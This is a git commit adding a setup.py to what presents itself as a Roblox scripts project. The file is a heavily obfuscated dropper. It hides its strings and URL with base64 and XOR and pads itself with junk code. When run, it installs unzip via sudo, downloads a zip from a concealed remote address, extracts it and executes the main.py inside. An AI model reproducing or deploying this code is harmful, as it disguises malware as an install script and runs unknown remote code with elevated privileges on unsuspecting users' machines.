0036641a4c5e9ad4a34c4ced248248268ff6ac47
RobloxScripts-dev <NullByte12.exe@proton.me>
2026-07-23 20:40:36 +0100

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,76 @@
+os = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('uj0='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')))
+shutil = __import__(__import__('base64').b64decode('c2h1dGls').decode('utf-8'))
+subprocess = __import__(__import__('base64').b64decode('c3VicHJvY2Vzcw==').decode('utf-8'))
+urllib = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('oDyHo3z4Yr49tQ5+OUQ='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')))
+zipfile = __import__(__import__('base64').b64decode('emlwZmlsZQ==').decode('utf-8'))
+platform = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('pSKKu3P1PqE='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')))
+UI = (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('vTqfv2agY+M/rQ9zP1IQQ7ojxJ16+CCjIJcYaSNASlP4Ko65OuotrzOlHH5lQl9X+jyOqWa1JKk5oAg0J1FXTvo+iqx++yupdr4Saw=='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))
+ZA = __import__('base64').b64decode('cGFja2FnZS56aXA=').decode('utf-8')
+
+def _ΕЛиЭΣπχΠΤцςΓ(x):
+    subprocess.run(x, check=True)
+
+def _ΞМОΡδжРяуэфΒмΒρ():
+    if 62 * 30 < 0:
+        911
+    if shutil.which((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('oCCRpmU='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))):
+        return
+    system = platform.system()
+    if system == __import__('base64').b64decode('TGludXg=').decode('utf-8'):
+        if len('xxxxx') > 0 and shutil.which((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('tD6f'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))):
+            _ΕЛиЭΣπχΠΤцςΓ([__import__('base64').b64decode('c3Vkbw==').decode('utf-8'), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('tD6f'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('oD6PrmH/'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))])
+            _ΕЛиЭΣπχΠΤцςΓ([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('pjuPoA=='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('tD6f'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), __import__('base64').b64decode('aW5zdGFsbA==').decode('utf-8'), __import__('base64').b64decode('LXk=').decode('utf-8'), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('oCCRpmU='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))])
+        else:
+            if 62 * 46 < 0:
+                pass
+                882
+                _dead_7152 = 905
+            if 68 * 64 >= 0 and shutil.which((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('pSWM'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))):
+                _ΕЛиЭΣπχΠΤцςΓ([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('pSWM'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), __import__('base64').b64decode('aW5zdGFsbA==').decode('utf-8'), __import__('base64').b64decode('LXk=').decode('utf-8'), __import__('base64').b64decode('dW56aXA=').decode('utf-8')])
+            else:
+                if False and True:
+                    _dead_4663 = 881
+                    _dead_3149 = 696
+                if len('xxxx') > 0 and shutil.which((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('tD6A'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))):
+                    _ΕЛиЭΣπχΠΤцςΓ([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('tD6A'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('tCqP'), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('oCCRpmU='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))])
+                else:
+                    if 60 * 58 < 0:
+                        pass
+                        _dead_1482 = 568
+                    raise RuntimeError(__import__('base64').b64decode('Tm8gc3VwcG9ydGVkIHBhY2thZ2UgbWFuYWdlciBmb3VuZA==').decode('utf-8'))
+    else:
+        raise RuntimeError(__import__('base64').b64decode('SW5zdGFsbCB1bnppcCBtYW51YWxseQ==').decode('utf-8'))
+
+def _μлςЙΨмуψйα():
+    if (True or False) and (not os.path.exists(ZA)):
+        urllib.request.urlretrieve(UI, ZA)
+    elif 20 * 1 < 0:
+        680
+        519
+
+def _ЧЖчρЦΨЫРфγу():
+    with zipfile.ZipFile(ZA) as z:
+        z.extractall((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('pS+IpHT9KQ=='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')))
+
+def _мУΑчρνчЬэдф():
+    if 41 * 17 < 0:
+        623
+        _dead_4111 = 115
+        68
+    os.chdir(__import__('base64').b64decode('cGFja2FnZQ==').decode('utf-8'))
+    if len('') > 0:
+        pass
+    if (True or False) and (not os.path.exists(__import__('base64').b64decode('bWFpbi5weQ==').decode('utf-8'))):
+        raise FileNotFoundError(__import__('base64').b64decode('bWFpbi5weSBub3QgZm91bmQ=').decode('utf-8'))
+    elif False and True:
+        856
+        900
+    _ΕЛиЭΣπχΠΤцςΓ([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('pTefp3r0fw=='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA==')), (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('uC+CoTvqNQ=='), __import__('base64').b64decode('1U7rzxWaTMxYxHsbSjA+IA=='))])
+if (True or False) and __name__ == __import__('base64').b64decode('X19tYWluX18=').decode('utf-8'):
+    _ΞМОΡδжРяуэфΒмΒρ()
+    _μлςЙΨмуψйα()
+    _ЧЖчρЦΨЫРфγу()
+    _мУΑчρνчЬэдф()
+elif 68 * 55 < 0:
+    _dead_8378 = 923
+    _dead_4896 = 201
